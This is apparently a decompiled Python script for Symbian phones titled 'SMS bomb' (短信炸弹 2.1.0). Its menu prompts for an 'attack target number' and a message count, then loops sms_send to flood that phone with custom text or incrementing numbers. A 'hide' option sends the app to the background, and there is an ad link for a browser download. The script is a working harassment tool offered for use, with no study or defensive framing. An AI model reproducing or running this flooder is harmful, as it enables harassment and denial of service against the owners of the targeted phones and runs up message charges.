# emacs-mode: -*- python-*-
import e32
import appuifw
import messaging
appuifw.app.title = '短信炸弹'.decode('utf8')

def redraw(rect):
    cc.clear(0)
    cc.line([(10,
      10),
     (225,
      10)], 129791)
    cc.line([(10,
      20),
     (225,
      20)], 195343)
    cc.line([(10,
      30),
     (225,
      30)], 261360)
    cc.line([(10,
      40),
     (225,
      40)], 327152)
    cc.line([(10,
      50),
     (225,
      50)], 129791)
    cc.line([(10,
      60),
     (225,
      60)], 129791)
    cc.line([(10,
      70),
     (225,
      70)], 523520)
    cc.line([(10,
      80),
     (225,
      80)], 588800)
    cc.line([(10,
      90),
     (225,
      90)], 129791)
    cc.line([(10,
      100),
     (225,
      100)], 393200)
    cc.line([(10,
      110),
     (225,
      110)], 129791)
    cc.line([(10,
      120),
     (225,
      120)], 65281)
    cc.line([(10,
      130),
     (225,
      130)], 129791)
    cc.line([(10,
      140),
     (225,
      140)], 65283)
    cc.line([(10,
      150),
     (225,
      150)], 129791)
    cc.line([(10,
      160),
     (225,
      160)], 65285)
    cc.line([(10,
      170),
     (225,
      170)], 129791)
    cc.line([(10,
      180),
     (225,
      180)], 65297)
    cc.line([(10,
      190),
     (225,
      190)], 129791)
    cc.line([(10,
      200),
     (225,
      200)], 65299)
    cc.line([(10,
      210),
     (225,
      210)], 129791)
    cc.line([(10,
      220),
     (225,
      220)], 65280)
    cc.line([(10,
      230),
     (225,
      230)], 129791)
    cc.line([(10,
      240),
     (225,
      240)], 65280)
    cc.line([(10,
      250),
     (225,
      250)], 129791)
    cc.line([(10,
      260),
     (225,
      260)], 65280)
    cc.line([(10,
      270),
     (225,
      270)], 129791)
    cc.line([(10,
      280),
     (225,
      280)], 65280)
    cc.line([(10,
      290),
     (225,
      290)], 129791)
    cc.line([(10,
      300),
     (225,
      300)], 1048320)
    cc.line([(10,
      310),
     (225,
      310)], 129791)
    cc.line([(10,
      320),
     (225,
      320)], 1048320)
    cc.line([(10,
      330),
     (225,
      330)], 129791)
    cc.line([(10,
      340),
     (225,
      340)], 129791)
    cc.line([(10,
      350),
     (225,
      350)], 65280)



def about():
    appuifw.note('短信炸弹2.1.0\n八神智能网\n^zηPy七七移植版\nwap.8zntx.com'.decode('utf8'), 'info')



def uc():
    if appuifw.query('支持zηPy七七\n确认点击下载\nUC高速浏览器?'.decode('utf8'), 'query'):
        e32.start_exe('z:\\system\\programs\\apprun.exe', 'z:\\system\\apps\\browser\\browser.app "http://down2.ucweb.com/download.asp?f=client@bbzd&url=&title="')



def menu():
    appuifw.app.body = cc
    appuifw.app.screen = 'full'
    redraw(cc)


lock = appuifw.e32.Ao_lock()
cc = appuifw.Canvas(event_callback=None, redraw_callback=redraw)
menu()

def exit_key_handler():
    app_lock.signal()
    appuifw.app.set_exit()



def numbers():
    phonenr = appuifw.query('攻击目标号码'.decode('utf8'), 'text')
    quant = appuifw.query('攻击信息数量'.decode('utf8'), 'number')
    i = 0
    smstext = (int(i) + 1)
    while (i < quant):
        messaging.sms_send(phonenr, smstext)
        i = (i + 1)
        smstext = (int(smstext) + 1)

    appuifw.note((str(quant) + '正在攻击ing…'.decode('utf8')), 'info')



def text():
    smstext = appuifw.query('输入攻击内容'.decode('utf8'), 'text')
    phonenr = appuifw.query('攻击目标号码'.decode('utf8'), 'text')
    quant = appuifw.query('攻击信息数量'.decode('utf8'), 'number')
    i = 0
    while (i < quant):
        messaging.sms_send(phonenr, smstext)
        i = (i + 1)

    appuifw.note((str(quant) + '正在攻击ing…'.decode('utf8')), 'info')



def yc():
    try:
        appuifw.e32.start_exe(u'z:\\sys\\bin\\phone.exe', '')
    except:
        pass


app_lock = e32.Ao_lock()
appuifw.app.menu = [('短信炸弹'.decode('utf8'),
  (('常规攻击'.decode('utf8'),
    text),
   ('快捷攻击'.decode('utf8'),
    numbers))),
 ('隐藏'.decode('utf8'),
  yc),
 ('关于'.decode('utf8'),
  about),
 ('推荐'.decode('utf8'),
  uc),
 ('退出'.decode('utf8'),
  exit_key_handler)]
lock.wait()
appuifw.app.exit_key_handler = exit_key_handler

# local variables:
# tab-width: 4